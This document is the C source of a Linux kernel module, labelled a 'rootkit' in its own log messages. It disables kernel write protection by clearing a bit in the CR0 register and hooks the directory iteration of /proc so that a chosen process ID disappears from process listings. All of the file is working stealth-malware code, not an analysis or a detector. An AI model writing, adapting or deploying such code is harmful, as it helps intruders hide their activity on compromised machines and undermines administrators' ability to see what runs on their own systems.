#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");

#define PATH "/proc"
#define SECRET_PROC 1

int (*real_iterate)(struct file *filp, struct dir_context *ctx);

int fake_iterate(struct file *filp, struct dir_context *ctx);

int (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);


static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
    // prevent read from being reordered with respect to writes, use a dummy operand.
}

// the 16th bit of cr0 should be flipped if we want to change the memory info. 
static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "protected memory\n");
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

void hook_iterate(void) {                       
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", PATH);          
    filp = filp_open(PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
    real_iterate = f_op->iterate_shared;                              
                                                    
    unprotect_memory();                     
    f_op->iterate_shared = fake_iterate;               
    protect_memory();                      
                                
}

void hook_cleanup(void) {
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", PATH);          
    filp = filp_open(PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
                            
    unprotect_memory();                     
    f_op->iterate_shared = real_iterate;               
    protect_memory();            
}

int fake_iterate(struct file *filp, struct dir_context *ctx) {
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}


int fake_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    
    long pid;
    kstrtol(name, 10, &pid);
    if (pid == SECRET_PROC) {
        printk(KERN_INFO "Hiding process: %s\n", name);
        return 0;
    }

    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}


static int __init mode_init(void) {
    printk(KERN_INFO "rootkit:init\n");
    hook_iterate();
    return 0;
}

static void __exit mode_exit(void) {
    hook_cleanup();
    printk(KERN_INFO "rootkit:exit\n");
}

module_init(mode_init);
module_exit(mode_exit);